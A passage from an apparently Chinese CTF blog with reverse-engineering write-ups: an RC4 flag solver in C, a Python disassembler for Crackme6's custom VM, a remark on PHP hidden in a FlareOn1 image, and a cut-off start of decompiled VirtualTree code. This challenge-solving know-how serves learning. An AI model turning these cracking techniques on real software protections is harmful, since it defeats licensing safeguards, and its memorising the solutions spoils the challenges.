class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint8_t</span> *v, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//初始化函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i =<span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//加解密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++) &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">     &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> key[<span class="number">5</span>];</span><br><span class="line">    key[<span class="number">0</span>] = <span class="number">71</span>;</span><br><span class="line">    key[<span class="number">1</span>] = <span class="number">75</span>;</span><br><span class="line">    key[<span class="number">2</span>] = <span class="number">67</span>;</span><br><span class="line">    key[<span class="number">3</span>] = <span class="number">84</span>;</span><br><span class="line">    key[<span class="number">4</span>] = <span class="number">70</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> sbox[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> data[] = &#123;<span class="number">0x2d</span>, <span class="number">0xd4</span>, <span class="number">0xf</span>, <span class="number">0xd0</span>, <span class="number">0x54</span>, <span class="number">0xee</span>, <span class="number">0x75</span>, <span class="number">0xd0</span>, <span class="number">0xe0</span>, <span class="number">0x30</span>, <span class="number">0x96</span>, <span class="number">0xe1</span>, <span class="number">0x79</span>, <span class="number">0x8a</span>, <span class="number">0xe0</span>, <span class="number">0xfe</span>, <span class="number">0x18</span>, <span class="number">0x3a</span>, <span class="number">0x27</span>, <span class="number">0xe7</span>, <span class="number">0x2f</span>, <span class="number">0x86</span>, <span class="number">0xc9</span>, <span class="number">0xfe</span>, <span class="number">0x66</span>, <span class="number">0x43</span>, <span class="number">0xa7</span>, <span class="number">0x75</span>&#125;;</span><br><span class="line">    rc4_init(sbox,key,<span class="keyword">sizeof</span>(key));</span><br><span class="line">    rc4_crypt(sbox,data,<span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="keyword">char</span> f[] = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(data);i++)&#123;</span><br><span class="line">        data[i]-=<span class="number">128</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,data[i]^f[i%<span class="number">4</span>]);</span><br><span class="line">        data[i]^=<span class="number">73</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,data,<span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><del>看答案发现动调和非动调情况下比对数据完全不同，应该是哪里做了手jio</del></p>
<p>就在上面，我瞎了</p>
<h2 id="rev-Crackme6"><a href="#rev-Crackme6" class="headerlink" title="[rev]Crackme6"></a>[rev]Crackme6</h2><ol>
<li>先检查pediy2016</li>
<li>长度为0x14</li>
<li>写反汇编jio本</li>
<li>先是一些常量计算</li>
<li>接下来三个 水仙花数</li>
<li>接下来是一个二元一次方程，解得1223</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import hashlib</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">opc &#x3D; [1, 0, 2, 0, 3, 0, 150, 0, 32, 33, 10, 0, 41, 1, 43, 1, 39, 246, 255, 129, 20, 33, 4, 0, 0, 1, 46, 18, 0, 128, 1, 99, 2, 9, 139, 0, 32, 33, 4, 0, 0, 1, 111, 42, 1, 139, 0, 32, 33, 4, 0, 0, 42, 1, 139, 0, 32, 33, 4, 0, 0, 1, 108, 42, 1, 139, 0, 32, 33, </span><br><span class="line">4, 0, 0, 1, 46, 3, 1, 20, 0, 128, 1, 49, 42, 1, 139, 0, 32, 33, 4, 0, 0, 11, 0, 32, </span><br><span class="line">41, 208, 8, 69, 69, 27, 42, 1, 11, 0, 32, 41, 208, 8, 69, 69, 27, 42, 1, 11, 0, 32, </span><br><span class="line">41, 208, 8, 69, 69, 29, 45, 29, 45, 27, 2, 13, 11, 0, 32, 41, 208, 65, 100, 42, 1, 17, 0, 32, 43, 208, 67, 10, 45, 42, 1, 17, 0, 32, 43, 208, 45, 29, 133, 33, 4, 0, 0, </span><br><span class="line">1, 46, 3, 2, 20, 0, 128, 42, 1, 11, 0, 32, 41, 208, 65, 10, 42, 1, 17, 0, 32, 43, 208, 45, 27, 42, 1, 17, 0, 32, 43, 208, 67, 10, 42, 1, 11, 0, 32, 41, 208, 48, 30, 4, </span><br><span class="line">45, 66, 4, 67, 2, 47, 129, 35, 38, 18, 0, 130, 94, 38, 13, 0, 1, 46, 3, 3, 20, 0, 128, 39, 4, 0, 0, 2, 0, 1, 0, 3, 46, 152, 0, 128, 38, 5, 0, 41, 1, 42, 1, 130, 4, 38, </span><br><span class="line">244, 255, 129, 4, 38, 4, 0, 153, 0]</span><br><span class="line"></span><br><span class="line">locs &#x3D; [4203214, 4202753, 4202797, 4202842, 4202887, 4202903, 4202919, 4202935, 4202952, 4202968, 4202985, 4203054, 4203134, -1, 4203219, 4203289, 4203370, 4203440, 4203521, 4203590, 4203670, 4203750, 4203820, 4203901, 4203971, 4204052, 4204093, 4204133, 4204173, 4204254, 4204213, 4204294, 4204335, 4204453, -1, -1, -1, -1, 4204558, 4204376, 4204448, 4204663, 4204712, 4204763, 4204814, 4204835, 4204856, 4204878, 4204901, 4204923, 4204946, 4205020, 4205105, 4205190, 4205266, 4205353, 4205429, 4205516, 4205603, 4205712, 4205821, 4205909, 4206019, 4206107, -1, 4206217, 4206266, 4206319, 4206372, 4206393, 4206414, 4206436, 4206459, 4206481, 4206504, 4206578, 4206665, -1, 4206752, 4206830, 4206919, 4206997, 4207086, 4207173, 4207282, 4207391, 4207479, 4207589, 4207677, -1, -1, -1, -1, -1, -1, -1, -1, 4207787, 4207836, 4207887, 4207938, 4207959, 4207980, 4208002, 4208025, 4208047, 4208070, 4208144, 4208229, -1, 4208314, 4208390, 4208477, 4208553, 4208640, 4208727, 4208836, 4208945, 4209033, 4209143, 4209231, -1, -1, -1, -1, -1, -1, -1, -1, 4209341, 4209428, 4209516, 4209604, 4209638, 4209672, 4209706, 4209741, 4209775, 4209810, 4209896, 4209993, -1, 4210090, 4210177, 4210275, 4210362, 4210460, 4210546, 4210643, 4210740, 4210827, 4210925, 4211012, 4211107]</span><br><span class="line">eip &#x3D; 0</span><br><span class="line"></span><br><span class="line">cpu &#x3D; [0,0,0,0]</span><br><span class="line">tmp&#x3D;0</span><br><span class="line"># vm_dh是flag</span><br><span class="line"># tmp&#x3D;0x2000的话是input</span><br><span class="line">while eip&lt;len(opc):</span><br><span class="line">    s&#x3D;&#39;&#39;</span><br><span class="line">    op &#x3D; opc[eip]</span><br><span class="line">    op1&#x3D;0</span><br><span class="line">    op2&#x3D;0</span><br><span class="line">    op3&#x3D;0</span><br><span class="line">    if eip+1&lt;len(opc):</span><br><span class="line">        op1 &#x3D; opc[eip+1]</span><br><span class="line">    if eip+2&lt;len(opc):</span><br><span class="line">        op2 &#x3D; opc[eip+2]</span><br><span class="line">    if eip+3&lt;len(opc):</span><br><span class="line">        op3 &#x3D; opc[eip+3]</span><br><span class="line">    tmp&#x3D;op1+op2*16</span><br><span class="line">    if op&gt;153:</span><br><span class="line">        break</span><br><span class="line">    loc &#x3D; locs[op]</span><br><span class="line">    print(&#39;%02x:%03X:%x:&#39;%(eip,op,loc),end&#x3D;&quot;&quot;)</span><br><span class="line">    if op&#x3D;&#x3D;0x0:</span><br><span class="line">        s&#x3D;&#39;exit\n&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x1:</span><br><span class="line">        s&#x3D;&#39;mov vm_al,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x2:</span><br><span class="line">        s&#x3D;&#39;mov vm_ah,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x3:</span><br><span class="line">        s&#x3D;&#39;mov vm_bl,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x04:</span><br><span class="line">        s&#x3D;&#39;mov vm_al,vm_ah&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x08:</span><br><span class="line">        s&#x3D;&#39;mov vm_bl,vm_al&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x0b:</span><br><span class="line">        s&#x3D;&#39;mov vm_al,[vm_ip+%xh+vm_ah]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x11:</span><br><span class="line">        s&#x3D;&#39;mov vm_bl,[vm_ip+%xh+vm_ah]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x12:</span><br><span class="line">        s&#x3D;&#39;mov [%xh+vm_ip],vm_al&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x14:</span><br><span class="line">        s&#x3D;&#39;mov [vm_ip+%xh+vm_ah],vm_al&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x1b:</span><br><span class="line">        s&#x3D;&#39;push vm_al&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x1e:</span><br><span class="line">        s&#x3D;&#39;pop vm_ah&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x1d:</span><br><span class="line">        s&#x3D;&#39;pop vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x21:</span><br><span class="line">        to &#x3D; tmp&amp;0xff</span><br><span class="line">        if to&gt;0x7f:</span><br><span class="line">            to-&#x3D;0x100</span><br><span class="line">        s&#x3D;&#39;jz %xh&#39;%(to+eip)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x26:</span><br><span class="line">        to &#x3D; tmp&amp;0xff</span><br><span class="line">        if to&gt;0x7f:</span><br><span class="line">            to-&#x3D;0x100</span><br><span class="line">        s&#x3D;&#39;jnz %xh&#39;%(to+eip)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x27:</span><br><span class="line">        to &#x3D; tmp&amp;0xff</span><br><span class="line">        if to&gt;0x7f:</span><br><span class="line">            to-&#x3D;0x100</span><br><span class="line">        s&#x3D;&#39;jmp %xh&#39;%(to+eip)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x29:</span><br><span class="line">        s&#x3D;&#39;add vm_al,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x2a:</span><br><span class="line">        s&#x3D;&#39;add vm_ah,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x2b:</span><br><span class="line">        s&#x3D;&#39;add vm_bl,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x2f:</span><br><span class="line">        s&#x3D;&#39;add vm_ah,vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x30:</span><br><span class="line">        s&#x3D;&#39;add vm_bl,vm_al&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x2d:</span><br><span class="line">        s&#x3D;&#39;add vm_al,vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x41:</span><br><span class="line">        s&#x3D;&#39;mul vm_al,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x42:</span><br><span class="line">        s&#x3D;&#39;mul vm_ah,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x43:</span><br><span class="line">        s&#x3D;&#39;mul vm_bl,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x45:</span><br><span class="line">        s&#x3D;&#39;mul vm_al,vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x81:</span><br><span class="line">        s&#x3D;&#39;test vm_al,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x82:</span><br><span class="line">        s&#x3D;&#39;test vm_ah,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x85:</span><br><span class="line">        s&#x3D;&#39;test vm_al,vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x8b:</span><br><span class="line">        s&#x3D;&#39;test vm_al,[vm_ip+%xh+vm_ah]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x96:</span><br><span class="line">        s&#x3D;&#39;test vm_ah,[vm_ip+%xh+vm_bl]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x98:</span><br><span class="line">        s&#x3D;&#39;test vm_bl,[vm_ip+%xh+vm_ah]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x99:</span><br><span class="line">        s&#x3D;&#39;success&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    else:</span><br><span class="line">        s&#x3D;&#39;nop&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    print(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="rev-FlareOn1-Javascrap"><a href="#rev-FlareOn1-Javascrap" class="headerlink" title="[rev][FlareOn1]Javascrap"></a>[rev][FlareOn1]Javascrap</h2><p>看html看了大半天，原来猫腻在图片中</p>
<p>二进制打开图片，最后有一段php代码，然后无限base64套娃就解出来了</p>
<h2 id="rev-MRCTF2020-VirtualTree"><a href="#rev-MRCTF2020-VirtualTree" class="headerlink" title="[rev][MRCTF2020]VirtualTree"></a>[rev][MRCTF2020]VirtualTree</h2><p>被骗了555<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int8_t</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125; TreeNode;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint8_t</span> *v, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_401120</span><span class="params">(TreeNode**treeHead)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  TreeNode *v1[<span class="number">15</span>]; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line">  TreeNode *v2; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+40h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+44h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i )</span><br><span class="line">    v1[i] = (TreeNode *)<span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j )&#123;</span><br><span class="line">    v1[j]-&gt;data = j + <span class="number">65</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v1[<span class="number">0</span>]-&gt;right = v1[<span class="number">1</span>];</span><br><span class="line">  v1[<span class="number">0</span>]-&gt;left = v1[<span class="number">2</span>];</span><br><span class="line">  v1[<span class="number">1</span>]-&gt;right = v1[<span class="number">3</span>];</span><br><span class="line">  v1[<span class="number">1</span>]-&gt;left = v1[<span class="number">4</span>];</span><br><span class="line">  v1[<span class="number">2</span>]-&gt;right = v1[<span class="number">5</span>];</span><br><span class="line">  v1[<span class="number">2</span>]-&gt;left = v1[<span class="number">6</span>];</span><br><span class="line">  v1[<span class="number">3</span>]-&gt;right = v1[<span class="number">7</span>];</span><br><span class="line">  v1[<span class="number">3</span>]-&gt;left = v1[<span class="number">8</span>];</span><br><span class="line">  v1[<span class="number">4</span>]-&gt;right = v1[<span class="number">9</span>];</span><br><span class="line">  v1[<span class="number">4</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line"> 